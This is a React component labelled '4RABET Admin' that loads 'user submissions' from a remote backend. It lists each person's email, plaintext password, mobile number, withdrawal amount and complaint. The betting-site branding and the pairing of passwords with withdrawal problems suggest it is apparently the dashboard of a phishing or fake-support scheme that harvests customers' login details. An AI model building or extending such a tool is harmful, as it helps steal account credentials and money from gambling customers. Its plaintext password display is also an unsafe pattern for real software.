import React, { useState, useEffect } from 'react';

function NewUserDetails() {
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchUsers = async () => {
      try {
        // Using the new /api/newusersdetails endpoint
        const response = await fetch('https://backend-4bet.vercel.app/newusersdetails');
        
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }
        
        const data = await response.json();
        setUsers(data);
        setLoading(false);
      } catch (error) {
        console.error('Error fetching users:', error);
        setError('Failed to load users. Please try again later.');
        setLoading(false);
      }
    };

    fetchUsers();
  }, []);

  // Format date function
  const formatDate = (dateString) => {
    const options = { 
      year: 'numeric', 
      month: 'long', 
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    };
    return new Date(dateString).toLocaleDateString(undefined, options);
  };

  const styles = {
    container: {
      maxWidth: '1200px',
      margin: '0 auto',
      padding: '20px',
      fontFamily: 'Arial, sans-serif',
    },
    header: {
      display: 'flex',
      justifyContent: 'space-between',
      alignItems: 'center',
      marginBottom: '30px',
      backgroundColor: '#222',
      padding: '15px',
      borderRadius: '8px',
      color: 'white',
    },
    logo: {
      fontSize: '26px',
      fontWeight: 'bold',
    },
    blueText: {
      color: '#0066cc',
    },
    title: {
      textAlign: 'center',
      fontSize: '24px',
      marginBottom: '20px',
      color: '#333',
    },
    table: {
      width: '100%',
      borderCollapse: 'collapse',
      marginTop: '20px',
      boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
      borderRadius: '8px',
      overflow: 'hidden',
    },
    th: {
      backgroundColor: '#f2f2f2',
      padding: '12px 15px',
      textAlign: 'left',
      borderBottom: '1px solid #ddd',
      fontSize: '14px',
      fontWeight: 'bold',
    },
    td: {
      padding: '12px 15px',
      borderBottom: '1px solid #ddd',
      fontSize: '14px',
    },
    tr: {
      backgroundColor: 'white',
    },
    trAlt: {
      backgroundColor: '#f9f9f9',
    },
    loading: {
      textAlign: 'center',
      padding: '40px',
      fontSize: '18px',
      color: '#666',
    },
    error: {
      textAlign: 'center',
      padding: '40px',
      fontSize: '18px',
      color: 'red',
    },
    emptyMessage: {
      textAlign: 'center',
      padding: '40px',
      fontSize: '18px',
      color: '#666',
    },
    password: {
      fontFamily: 'monospace',
      letterSpacing: '1px',
    },
  };

  if (loading) {
    return <div style={styles.loading}>Loading user data...</div>;
  }

  if (error) {
    return <div style={styles.error}>{error}</div>;
  }

  return (
    <div style={styles.container}>
      <header style={styles.header}>
        <div style={styles.logo}>
          4RA<span style={styles.blueText}>BET</span> Admin
        </div>
      </header>

      <h1 style={styles.title}>User Submissions</h1>
      
      {users.length === 0 ? (
        <div style={styles.emptyMessage}>No user submissions found.</div>
      ) : (
        <table style={styles.table}>
          <thead>
            <tr>
              <th style={styles.th}>Email</th>
              <th style={styles.th}>Password</th>
              <th style={styles.th}>Mobile Number</th>
              <th style={styles.th}>Withdrawal Amount</th>
              <th style={styles.th}>Problem</th>
              <th style={styles.th}>Submission Date & Time</th>
            </tr>
          </thead>
          <tbody>
            {users.map((user, index) => (
              <tr key={user._id} style={index % 2 === 0 ? styles.tr : styles.trAlt}>
                <td style={styles.td}>{user.email}</td>
                <td style={{...styles.td, ...styles.password}}>{user.password}</td>
                <td style={styles.td}>{user.mobileNumber}</td>
                <td style={styles.td}>{user.withdrawalAmount}</td>
                <td style={styles.td}>{user.problem}</td>
                <td style={styles.td}>{formatDate(user.submissionDate)}</td>
              </tr>
            ))}
          </tbody>
        </table>
      )}
    </div>
  );
}

export default NewUserDetails;
